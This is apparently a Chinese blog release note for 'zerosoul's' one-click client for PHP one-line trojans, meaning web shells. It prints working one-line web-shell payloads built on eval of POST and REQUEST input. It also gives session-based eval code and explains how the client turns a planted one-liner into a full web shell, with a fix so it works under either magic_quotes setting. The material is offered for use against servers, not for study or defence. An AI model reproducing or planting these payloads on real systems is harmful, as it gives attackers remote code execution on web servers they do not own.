零魂PHP一句话木马客户端 v0.2(一键提交版)

Author:zerosoul(零魂)



2009-11-11(正好是光棍节，晕~)更新内容:

-----------------------------

1.修补了下原始版本有些服务器不能正常运行的大Bug。

2.去掉了提交后的登陆密码验证，提交后直接进入大马界面。

-----------------------------


更新说明:

-----------------------------

这玩意本来就是为了方便自己做的，所以本来只打算对自己负责，呵呵。好马好工具如果传出来必然被传烂掉，但这东西无所谓，又不是多特别的东西，但有时候用着比较方便，所以发出来也无妨。

但是发出来后有朋友告诉我有些服务器上运行没成功，心里顿觉愧疚，发个小东西出来，结果功能还有问题，岂不是欺骗大众。但是一直在忙，除了当时做的时候之外，几乎再没去测试过。昨晚hiphop兄给我说他那有台服务器用不起，本来打算让他发Shell来我正好测试下具体原因，结果他说他已经测试了并告诉是magic_quotes_gpc的原因(是个低级错误...)，得谢谢他。


然后花了个把小时详细测试并修改了下

相关关键代码:

session_start();$_SESSION[chr(99)]=get_magic_quotes_gpc()?stripslashes($_POST[chr(100)]):$_POST[chr(100)];eval($_SESSION[chr(99)]);

-----------------------------


现在的版本magic_quotes_gpc On和Off都测试OK，不过不知道还有没有其它会造成不正常的因素，实在懒的自己去一个一个测试了，等遇到了再说吧，也欢迎大家反馈。


-----------------------------
-----------------------------





原版内容:

-----------------------------

一句话:
<?php eval($_POST['c'])?> 
<?php eval($_REQUEST['c'])?>

海洋顶端有个一键提交版的ASP一句话客户端，很方便，一次提交之后，一句话就可以当大马用了。

但是PHP一句话一直没有见这样的客户端，网上居然还有转的到处都是的工具，结果下载下来不能用。

比较喜欢一句话的一键提交这种形式，所以花了2x半个通宵的时间做了这个东西，思路参考的是海洋，客户端的CSS也是修改它的，呵呵。

由于一键提交版的特殊性，暂时是不能随心所欲的换密码的，这个客户端的密码是字母c。


大概原理:

一键提交版的一句话客户端连接成功之后，每次POST数据的时候, 假设一句话密码是c，都要先让本地表单:

c = session_start();eval($_SESSION[chr(120)]);  

chr(120)就是字母c，为了避免单引号写成chr(120)形式。

然后一句话在eval($_POST[c])的时候，才能执行保存在Session中的我们的PHP代码。

想用其它密码的朋友可以依据这个原理修改。






Blog
http://hi.baidu.com/0soul